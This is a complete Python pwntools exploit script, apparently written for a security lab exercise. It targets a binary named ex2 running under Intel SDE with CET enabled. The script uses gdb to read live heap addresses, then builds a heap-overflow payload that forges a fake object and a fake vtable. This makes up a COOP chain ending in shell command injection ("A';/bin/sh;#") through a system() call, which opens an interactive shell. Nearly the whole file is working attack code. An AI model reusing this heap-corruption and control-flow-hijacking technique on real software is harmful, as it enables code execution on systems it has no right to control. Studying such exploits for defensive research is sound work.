#!/usr/bin/env python3
import sys
import os
import re
import subprocess
import tempfile
import time
from pwn import *

# =============================================================================
# CONFIGURATION
# =============================================================================
#
# We exploit ex2 *under SDE with CET enabled*.
# The tricky part: heap addresses under SDE are different each run, so we
# cannot hardcode the heap base. Instead, we:
#
#   1. Start SDE in -debug mode (it waits for a debugger).
#   2. Attach gdb remotely to SDE.
#   3. Break at read(), continue, then 'up' to main(), where e1/e2/e3/p exist.
#   4. Print their addresses and chunk headers.
#   5. Detach from SDE so the program continues and waits for input.
#   6. Use those live addresses to build an exact heap payload.
#   7. The payload:
#        - overwrites e2 with a fake Project object whose onProjectRelease
#          points to announceUsers().
#        - overwrites e3 with a fake vtable full of Project::releaseProject().
#      Then delete p triggers ~Project(), which calls workers[i]->deassignProject()
#      on each Employee, and we get a COOP chain:
#
#         delete p
#           -> ~Project()
#              -> e2->deassignProject()
#                 -> fake vtable entry -> Project::releaseProject(e2, msg)
#                    -> e2->onProjectRelease(msg)
#                       -> announceUsers(msg)
#                          -> system("wall '%s'", msg)  // command injection
#
#   8. Our msg is "A';/bin/sh;#\x00", so system runs:
#         wall 'A';/bin/sh;#'
#      which executes /bin/sh.
#
# The script does all of this automatically.
#

context.arch = "amd64"
context.log_level = "info"   # change to "debug" if you want more pwntools noise

BINARY    = "./bin/ex2"
SDE_PATH  = "./sdekit/sde64"
CET_LOG   = "cet.log"

# SDE arguments:
# NOTE: we do NOT put "--" here so we can append "-debug -- BINARY" later.
SDE_ARGS = ["-no-follow-child", "-cet", "-cet_output_file", CET_LOG]

# =============================================================================
# GDB COMMAND TEMPLATES
# =============================================================================

# These commands are executed in gdb *before* attaching to SDE.
GDB_PREAMBLE = r"""
set width 0
set height 0
set verbose off
set confirm off
set pagination off
"""

# These commands are executed in gdb *after* attaching to SDE.
# They:
#   - break at read()
#   - continue to the vulnerability point
#   - up to main() where e1/e2/e3/p live
#   - print addresses & chunk headers
#   - print sizeof(Project) and offset of onProjectRelease
#   - detach, allowing SDE to resume execution
GDB_INSPECT = r"""
# Stop when the vulnerable read() is reached
break read
continue

# Move from read() back up into main(), where e1,e2,e3,p are in scope
up

# Dump heap object addresses
echo |START_LAYOUT|\n
print /x e1
print /x e2
print /x e3
print /x p
print /x &e1->_name
echo |END_LAYOUT|\n

# Dump the chunk headers for e2, e3, p
echo |START_CHUNKS|\n
x/2gx (char*)e2-16
x/2gx (char*)e3-16
x/2gx (char*)p-16
echo |END_CHUNKS|\n

# Dump structure layout information for Project
echo |START_INFO|\n
print sizeof(Project)
print /x &((Project*)0)->onProjectRelease
echo |END_INFO|\n

# Detach from the remote process so SDE can resume execution
detach
quit
"""

# =============================================================================
# PARSING GDB OUTPUT
# =============================================================================

def parse_layout_output(out: str):
    """
    Parse the gdb output produced by GDB_INSPECT into a dictionary:

      layout = {
        "e1", "e2", "e3", "p", "e1_name",
        "name_off", "off_e2", "off_e3", "off_p",
        "headers": { "e2": (prev, size), "e3": ..., "p": ... },
        "proj_size", "onrel_off"
      }
    """
    layout = {}

    # -----------------------
    # 1. Object addresses
    # -----------------------
    m = re.search(r"\|START_LAYOUT\|(.*?)\|END_LAYOUT\|", out, re.DOTALL)
    if not m:
        return None

    addrs = re.findall(r"=\s*(0x[0-9a-f]+)", m.group(1), re.IGNORECASE)
    if len(addrs) < 5:
        return None

    layout["e1"]      = int(addrs[0], 16)
    layout["e2"]      = int(addrs[1], 16)
    layout["e3"]      = int(addrs[2], 16)
    layout["p"]       = int(addrs[3], 16)
    layout["e1_name"] = int(addrs[4], 16)

    # Relative offsets from e1
    layout["name_off"] = layout["e1_name"] - layout["e1"]
    layout["off_e2"]   = layout["e2"]      - layout["e1"]
    layout["off_e3"]   = layout["e3"]      - layout["e1"]
    layout["off_p"]    = layout["p"]       - layout["e1"]

    # -----------------------
    # 2. Chunk headers
    # -----------------------
    headers = {}
    m = re.search(r"\|START_CHUNKS\|(.*?)\|END_CHUNKS\|", out, re.DOTALL)
    if m:
        lines = [ln for ln in m.group(1).strip().splitlines() if ln.strip()]
        names = ["e2", "e3", "p"]
        idx   = 0
        for line in lines:
            parts = line.split()
            nums = [int(tok.rstrip(":"), 16) for tok in parts if tok.startswith("0x")]
            if len(nums) >= 2:
                # Typical format: addr: prev size
                if len(nums) == 3:
                    headers[names[idx]] = (nums[1], nums[2])
                else:
                    headers[names[idx]] = (nums[0], nums[1])
                idx += 1
                if idx >= 3:
                    break

    # Fallback defaults (from earlier manual recon)
    headers.setdefault("e2", (0, 0x51))
    headers.setdefault("e3", (0, 0x51))
    headers.setdefault("p",  (0, 0x31))
    layout["headers"] = headers

    # -----------------------
    # 3. Project info
    # -----------------------
    m = re.search(r"\|START_INFO\|(.*?)\|END_INFO\|", out, re.DOTALL)
    if m:
        vals = re.findall(r"=\s*(0x[0-9a-f]+|\d+)", m.group(1), re.IGNORECASE)
        layout["proj_size"] = int(vals[0], 0) if len(vals) > 0 else 40
        layout["onrel_off"] = int(vals[1], 0) if len(vals) > 1 else 32
    else:
        # Reasonable defaults from manual inspection:
        layout["proj_size"], layout["onrel_off"] = 40, 32

    return layout

# =============================================================================
# PAYLOAD GENERATOR (COOP chain via announceUsers)
# =============================================================================

def generate_payload(layout, addr_release, addr_announce):
    """
    Given a live layout and target addresses:
      - addr_release: Project::releaseProject
      - addr_announce: announceUsers

    Build a heap overflow payload that:

    1. Places the COOP input string into e1->name:
         "A';/bin/sh;#\x00"
       which leads to command injection in announceUsers via:
         system("wall '%s'", msg)

    2. Overwrites the e2 chunk user area to be a fake Project object:
         vptr               -> e3 (fake vtable region)
         onProjectRelease   -> announceUsers

    3. Overwrites the e3 chunk user area to be a fake vtable:
         all entries        -> Project::releaseProject

    4. Leaves p's header intact (we don't need to corrupt p).
    """

    heap_base = layout["e1"]
    e2        = heap_base + layout["off_e2"]
    e3        = heap_base + layout["off_e3"]

    log.info(f"Generating payload for Heap Base: {hex(heap_base)}")

    name_start = heap_base + layout["name_off"]

    # --------------------------------------------------------
    # 1) Craft the string passed into onProjectRelease(msg)
    # --------------------------------------------------------
    # Headers for e2 start at e2 - 16 (prev_size, size)
    e2_hdr_addr = e2 - 0x10
    gap         = e2_hdr_addr - name_start

    # This string is used in the COOP chain:
    #   announceUsers(msg) -> system("wall '%s'", msg)
    # We inject:
    #   "A';/bin/sh;#"
    # so the shell sees:
    #   wall 'A';/bin/sh;#'
    inject = b"A';/bin/sh;#\x00"

    if len(inject) > gap:
        log.error(f"[gen] Gap too small between e1->name and e2 header: {gap} bytes")
        return None

    payload = bytearray(b"A" * gap)
    payload[0:len(inject)] = inject

    # --------------------------------------------------------
    # 2) Repair e2 chunk header
    # --------------------------------------------------------
    prev_e2, size_e2 = layout["headers"]["e2"]
    payload += p64(prev_e2) + p64(size_e2)

    # --------------------------------------------------------
    # 3) Forge e2 as a Project-like object
    # --------------------------------------------------------
    # e2 user region size
    user_e2_sz = (size_e2 & ~0x7) - 0x10

    # Fake vtable will live in the e3 user region
    fake_vtable_loc = e3

    proj_size  = layout["proj_size"]
    onrel_off  = layout["onrel_off"]

    # Construct Project object body
    body = bytearray(proj_size)

    # vptr: point to fake vtable in e3
    body[0:8] = p64(fake_vtable_loc)

    # onProjectRelease field: set to announceUsers
    body[onrel_off:onrel_off+8] = p64(addr_announce)

    payload += body

    # Pad remaining e2 user area with junk
    pad = user_e2_sz - proj_size
    if pad < 0:
        log.error("[gen] Project structure larger than e2 user region")
        return None

    payload += b"B" * pad

    # --------------------------------------------------------
    # 4) Repair e3 header
    # --------------------------------------------------------
    prev_e3, size_e3 = layout["headers"]["e3"]
    payload += p64(prev_e3) + p64(size_e3)

    # --------------------------------------------------------
    # 5) Build fake vtable in e3 user area
    # --------------------------------------------------------
    user_e3_sz = (size_e3 & ~0x7) - 0x10
    entries    = user_e3_sz // 8

    # The Employee::deassignProject entry we care about is one of the early
    # slots; we just fill all entries with Project::releaseProject, so any
    # virtual call into e2 goes to releaseProject.
    payload += p64(addr_release) * entries

    # --------------------------------------------------------
    # 6) Repair p header (we don't change the Project object)
    # --------------------------------------------------------
    prev_p, size_p = layout["headers"]["p"]
    payload += p64(prev_p) + p64(size_p)

    return bytes(payload)

# =============================================================================
# MAIN EXPLOIT ROUTINE (SDE mode)
# =============================================================================

def exploit():
    elf = ELF(BINARY, checksec=False)

    # Resolve symbol addresses by partial name
    def get_sym(sub):
        for k, v in elf.symbols.items():
            if sub in k:
                return v
        return None

    addr_release  = get_sym("releaseProject")
    addr_announce = get_sym("announceUsers")

    if not addr_release or not addr_announce:
        log.error("Symbols not found (releaseProject / announceUsers)")
        sys.exit(1)

    log.info(f"Project::releaseProject = {hex(addr_release)}")
    log.info(f"announceUsers           = {hex(addr_announce)}")

    mode = "sde"
    if len(sys.argv) > 1 and "nat" in sys.argv[1].lower():
        mode = "native"

    # -------------------------------------------------------------------------
    # Native mode (not used for final lab, only for manual testing)
    # -------------------------------------------------------------------------
    if mode == "native":
        log.info("Native mode requested — starting ./bin/ex2 directly.")
        p = process(BINARY)
        log.warning("This script is designed for SDE + CET; native mode is just for manual tinkering.")
        p.interactive()
        return

    # -------------------------------------------------------------------------
    # SDE mode: full dynamic exploit
    # -------------------------------------------------------------------------
    if os.path.exists(CET_LOG):
        os.unlink(CET_LOG)

    log.info("Starting SDE in debug mode...")

    # Start SDE in -debug mode so it waits for gdb to connect:
    #   ./sde64 <SDE_ARGS> -debug -- ./bin/ex2
    p = process([SDE_PATH] + SDE_ARGS + ["-debug", "--", BINARY],
                stderr=subprocess.STDOUT)

    # --------------------------
    # 1) Parse the remote port
    # --------------------------
    log.info("Waiting for GDB port from SDE...")

    try:
        port = None
        while True:
            line = p.recvline().decode("latin-1").strip()
            # SDE prints a hint: "target remote :<PORT>"
            if "target remote" in line:
                port = line.split(":")[-1].strip()
                break
            if "Insert name" in line:
                log.error("Missed debug prompt! SDE didn't stop for debugger.")
                sys.exit(1)
    except Exception as e:
        log.error(f"Failed to parse SDE port: {e}")
        sys.exit(1)

    log.success(f"SDE is listening on port {port}")

    # --------------------------
    # 2) Attach gdb to SDE
    # --------------------------
    gdb_cmds = GDB_PREAMBLE + f"target remote 127.0.0.1:{port}\n" + GDB_INSPECT

    with tempfile.NamedTemporaryFile(mode="w", delete=False) as tf:
        tf.write(gdb_cmds)
        script_name = tf.name

    layout = None

    # Try up to 3 times to attach and extract layout
    for attempt in range(1, 4):
        log.info(f"Attaching gdb to extract layout (Attempt {attempt}/3)...")
        # Small backoff between attempts to let SDE be ready
        time.sleep(2.0 + attempt)

        try:
            gdb_out = subprocess.check_output(
                ["gdb", "-batch", "-nx", "-x", script_name, BINARY],
                stderr=subprocess.STDOUT,
                text=True,
            )
            layout = parse_layout_output(gdb_out)
            if layout:
                break
            else:
                log.warning("gdb ran, but layout parsing failed (no markers or addresses).")
        except subprocess.CalledProcessError as e:
            log.warning(f"gdb attempt {attempt} failed with code {e.returncode}")
            log.warning(f"gdb output:\n{e.output}")

    os.unlink(script_name)

    if not layout:
        log.error("Failed to extract layout after retries; check gdb output above.")
        p.kill()
        sys.exit(1)

    log.info(f"Dynamic Heap Base (e1) under SDE: {hex(layout['e1'])}")

    # --------------------------
    # 3) Build payload for this specific run
    # --------------------------
    payload = generate_payload(layout, addr_release, addr_announce)
    if not payload:
        log.error("Payload generation failed.")
        p.kill()
        sys.exit(1)

    # --------------------------
    # 4) Send payload to the paused program
    # --------------------------
    log.info("Sending payload...")
    # Flush any remaining output (like "Insert name ...")
    try:
        p.clean(timeout=0.5)
    except Exception:
        pass

    # Name is read with read(0,newName,255), so send raw bytes
    p.send(payload)

    log.success("Payload sent; switching to interactive. Try `id`.")
    p.interactive()

    # Optional: inspect CET log
    if os.path.exists(CET_LOG):
        log.info("CET Log content:")
        with open(CET_LOG, "r") as f:
            print(f.read())


if __name__ == "__main__":
    exploit()

